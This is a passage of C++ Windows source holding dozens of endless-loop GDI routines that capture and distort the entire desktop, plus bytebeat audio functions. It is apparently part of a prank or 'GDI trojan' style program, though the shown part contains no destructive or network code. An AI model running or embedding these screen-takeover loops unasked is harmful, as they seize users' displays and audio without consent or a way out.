		for (int x = 0; x < w; x++) {
			for (int y = 0; y < h; y++) {
				int index = y * w + x;
				FLOAT fx = (y ^ (x + y)) + (i * 4);
				rgbquadCopy = rgbquad[index];
				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / 300.f + y / h * .1f, 1.f);
				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}
		i++;
		StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
		ReleaseDC(NULL, hdc); DeleteDC(hdc);
	}
	return 0x00;
}

DWORD WINAPI shader28(LPVOID lpParam) {
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int screenWidth = GetSystemMetrics(SM_CXSCREEN);
	int screenHeight = GetSystemMetrics(SM_CYSCREEN);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;
	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = screenWidth;
	bmpi.bmiHeader.biHeight = screenHeight;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;
	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);
	INT i = 0;
	while (true) {
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, screenWidth, screenHeight, hdc, 0, 0, screenWidth, screenHeight, SRCCOPY);
		RGBQUAD rgbquadCopy;
		for (int x = 0; x < screenWidth; x++) {
			for (int y = 0; y < screenHeight; y++) {
				int index = y * screenWidth + x;
				int fx = (int)((i ^ 4) + (i * 4) * sqrt(y << x) * sqrt(log2(i)));
				rgbquadCopy = rgbquad[index];
				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / 400.f + y / screenHeight * .2f, 1.f);
				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}
		i++;
		StretchBlt(hdc, 0, 0, screenWidth, screenHeight, hdcCopy, 0, 0, screenWidth, screenHeight, SRCCOPY);
		ReleaseDC(NULL, hdc);
		DeleteDC(hdc);
	}
	return 0x00;
}

DWORD WINAPI shader29(LPVOID lpParam) {
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int screenWidth = GetSystemMetrics(SM_CXSCREEN);
	int screenHeight = GetSystemMetrics(SM_CYSCREEN);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;
	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = screenWidth;
	bmpi.bmiHeader.biHeight = screenHeight;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;
	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);
	INT i = 0;
	while (true) {
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, screenWidth, screenHeight, hdc, 0, 0, screenWidth, screenHeight, SRCCOPY);
		RGBQUAD rgbquadCopy;
		for (int x = 0; x < screenWidth; x++) {
			for (int y = 0; y < screenHeight; y++) {
				int index = y * screenWidth + x;
				int fx = (int)((i ^ 4) + (i * 4) * sqrt(y * x & y * i * x));
				rgbquadCopy = rgbquad[index];
				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / 400.f + y / screenHeight * .2f, 1.f);
				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}
		i++;
		StretchBlt(hdc, 0, 0, screenWidth, screenHeight, hdcCopy, 0, 0, screenWidth, screenHeight, SRCCOPY);
		ReleaseDC(NULL, hdc);
		DeleteDC(hdc);
	}
	return 0x00;
}

DWORD WINAPI tan(LPVOID lpParam) {
	float angle = 0.0f;
	while (true) {
		HDC hdc = GetDC(0);
		int w = GetSystemMetrics(0);
		int h = GetSystemMetrics(1);
		HDC mdc = CreateCompatibleDC(hdc);
		HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
		SelectObject(mdc, bmp);
		BitBlt(mdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		for (int x = 0; x < w; x++) {
			int offset = (int)(2 * tan(angle + x * 0.01f));
			BitBlt(mdc, x, 0, 1, h, mdc, x, offset, SRCCOPY);
		}
		for (int y = 0; y < h; y++) {
			int offset = (int)(2 * tan(angle + y * 0.01f));
			BitBlt(mdc, 0, y, w, 1, mdc, offset, y, SRCCOPY);
		}
		BitBlt(hdc, 0, 0, w, h, mdc, 0, 0, SRCCOPY);
		angle += 0.1f;
		ReleaseDC(0, hdc);
		DeleteDC(mdc); DeleteObject(bmp);
	}
	return 0;
}

DWORD WINAPI trianglez(LPVOID lpParam) {
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	int sx = 1, sy = 1, sx1 = 1, sy1 = 1;
	int incrementation = 10;
	int x = 10, y = 10;
	while (true) {
		HDC hdc = GetDC(0);
		x += incrementation * sx;
		y += incrementation * sy;
		int tw = 0 + x, th = 0 + y;
		int bw = 100 + x, bh = 100 + y;
		HBRUSH hbsh = CreateSolidBrush(Hue(3));
		SelectObject(hdc, hbsh);
		POINT vertices[] = { { tw, bh }, { bw, bh }, { (tw + bw) / 2, th } };
		POINT center = { (tw + bw) / 2, (th + bh) / 2 };
		Polygon(hdc, vertices, sizeof(vertices) / sizeof(vertices[0]));
		if (y >= GetSystemMetrics(1)) {
			sy = -1;
		}
		if (x >= GetSystemMetrics(0)) {
			sx = -1;
		}
		if (y == 0) {
			sy = 1;
		}
		if (x == 0) {
			sx = 2;
		}
		DeleteObject(hbsh);
		ReleaseDC(0, hdc);
		Sleep(10);
	}
}

DWORD WINAPI shader30(LPVOID lpParam) {
	int time = GetTickCount();
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	for (int i = 0;; i++, i %= 3) {
		HDC desk = GetDC(0);
		HDC hdcdc = CreateCompatibleDC(desk);
		HBITMAP hbm = CreateBitmap(w, h, 1, 32, data);
		SelectObject(hdcdc, hbm);
		BitBlt(hdcdc, 0, 0, w, h, desk, 0, 0, NOTSRCERASE);
		GetBitmapBits(hbm, w * h * 4, data);
		int v = 0;
		BYTE byte = 0;
		if ((GetTickCount() - time) > 60000)
			byte = rand() % 255;
		for (int i = 0; w * h > i; i++) {
			if (i % h && rand() % 110)
				v = rand() % 2;
			*((BYTE*)data + 4 * i + v) = i;
		}
		SetBitmapBits(hbm, w * h * 4, data);
		BitBlt(desk, 0, 0, w, h, hdcdc, 0, 0, NOTSRCERASE);
		ReleaseDC(0, desk);
		DeleteObject(hbm);
		DeleteObject(hdcdc);
		DeleteObject(desk);
	}
	return 0;
}

DWORD WINAPI shader31(LPVOID lpParam) {
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);
	int y = 0;
	for (;;) {
		hdcScreen = GetDC(0);
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
		for (INT i = 0; i < w * h; i++) {
			rgbScreen[i].rgb = (rgbScreen[i].rgb * 2) % (RGB(255, 255, 255));
		}
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
		BitBlt(hdcScreen, 0, 0, w, h - y, hdcMem, 0, y, SRCCOPY);
		BitBlt(hdcScreen, 0, h - y, w, y, hdcMem, 0, 0, SRCCOPY);
		y = y + 1;
		if (h <= y) { y = 0; }
		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
	}
}

DWORD WINAPI woah(LPVOID lpParam) {
	while (true) {
		HDC hdc = GetDC(0);
		int w = GetSystemMetrics(0);
		int h = GetSystemMetrics(1);
		HDC mdc = CreateCompatibleDC(hdc);
		HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
		SelectObject(mdc, bmp);
		BitBlt(mdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		StretchBlt(hdc, rand() % 10, rand() % 10, w - 20, h - 20, mdc, 0, 0, w, h, SRCCOPY);
		BLENDFUNCTION blend = { 0, 0, 100, 0 };
		AlphaBlend(hdc, 0, 0, w, h, mdc, 0, 0, w, h, blend);
		ReleaseDC(0, hdc);
		DeleteDC(mdc); DeleteObject(bmp);
	}
}

DWORD WINAPI woah1(LPVOID lpParam) {
	while (true) {
		HDC hdc = GetDC(0);
		int w = GetSystemMetrics(0);
		int h = GetSystemMetrics(1);
		HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
		SelectObject(hdc, brush);
		BitBlt(hdc, 0, rand() % 40 - 20, w, h, hdc, rand() % 40 - 20, 0, 0x1900AC010E);
		DeleteObject(brush);
		ReleaseDC(0, hdc);
	}
}

DWORD WINAPI shader32(LPVOID lpParam) {
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);
	for (;;) {
		hdcScreen = GetDC(0);
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
		for (INT i = 0; i < w * h; i++) {
			INT x = i % w, y = i / w;
			int cx = x - (w / 2), cy = y - (h / 2);
			int zx = (cx * cx), zy = (cy * cy);
			int di = 928.0 + i;
			int fx = di + (di * log(log2(1 + zy) / 32.0));
			rgbScreen[i].rgb += fx + i;
		}
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
	}
}

DWORD WINAPI shader33(LPVOID lpParam) {
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int screenWidth = GetSystemMetrics(SM_CXSCREEN);
	int screenHeight = GetSystemMetrics(SM_CYSCREEN);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;
	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = screenWidth;
	bmpi.bmiHeader.biHeight = screenHeight;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;
	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);
	INT i = 0;
	while (true) {
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, screenWidth, screenHeight, hdc, 0, 0, screenWidth, screenHeight, SRCCOPY);
		RGBQUAD rgbquadCopy;
		for (int x = 0; x < screenWidth; x++) {
			for (int y = 0; y < screenHeight; y++) {
				int index = y * screenWidth + x;
				int fx = (int)((i ^ 4) + (i * 4) * ceil(255));
				rgbquadCopy = rgbquad[index];
				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / 400.f + y / screenHeight * .2f, 1.f);
				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}
		i++;
		StretchBlt(hdc, 0, 0, screenWidth, screenHeight, hdcCopy, 0, 0, screenWidth, screenHeight, SRCCOPY);
		ReleaseDC(NULL, hdc);
		DeleteDC(hdc);
	}
	return 0x00;
}

VOID WINAPI sound1() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * (t >> 5 | t >> 4 | t) & (t >> 11 | t >> 9));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound2() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 16000, 16000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[16000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * ((t >> 8 & t >> 4) >> (t >> 10 & t >> 8)) | t & t >> 7);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound3() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[11025 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(~t * (t ^ t >> 5));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound4() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t >> 6 ^ t & 37 | t << 1 & (t & 598 ? t >> 4 : t >> 10));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound5() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[32000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * ((t >> 13) % 8 + 1) & t * ((t >> 10 & 4 | t >> 12 & 6 | t >> 16 & 12) & 6 | (t >> 18) % 8) - (-t >> 16) % 4 * 9);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound6() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(14 * (t >> 6 | t | t >> (t >> 16)) + (3 & t >> 5));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound7() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * ((t >> 7 | t >> 9) & 25 | t << 5));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound8() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t + (t & t ^ t >> 5) + t * (t >> 8 & (t % 16 ? 2 : 6) & t >> 8));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound9() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[11025 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t ^ t * (t >> 9 | 11));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound10() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[11025 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t & t + (1 + (t >> 9 & t >> 5)));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound11() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 16000, 16000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[16000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * (t >> 6 & t >> 8 & 73 & t >> 3));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound12() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 13000, 13000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[13000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t ^ t * (1 + (t >> 9 & t >> 5)) & 128);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound13() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t >> 3) * (t & (t & 32768 ? 16 : 24) | t >> (t >> 8 & 26)) | t >> 2;

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound14() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[11025 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * (t / 1024 ^ t) | t >> 2);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound15() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 16000, 16000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[16000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(3 * t ^ t >> 6 | t);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound16() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 16000, 16000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[16000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>((t * (42 & t >> 10)) % 255 + (t * (42 & t >> 10)) % 127) + (t | t % 255 | t % 257) + (t & t >> 8);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound17() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[32000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * (t >> 6 & t >> 7) + (t & t >> 9));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound18() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t >> 3 + 3 * t | t << 3 % (t + 1));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound19() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 22050, 22050, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[22050 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * (t >> 13 | t >> 8) | t >> 16 ^ t);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound20() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 22050, 22050, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[22050 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * (t >> 11 * ((t >> 1 | t) >> 4) & (19 * (t >> 19) >> t | 14)));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound21() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 16000, 16000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[16000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(~t >> 1 & (t >> 14 & 5 ? 1 : 4 - (t >> 12 & 1)) * t & (t >> 7) + t);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound22() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
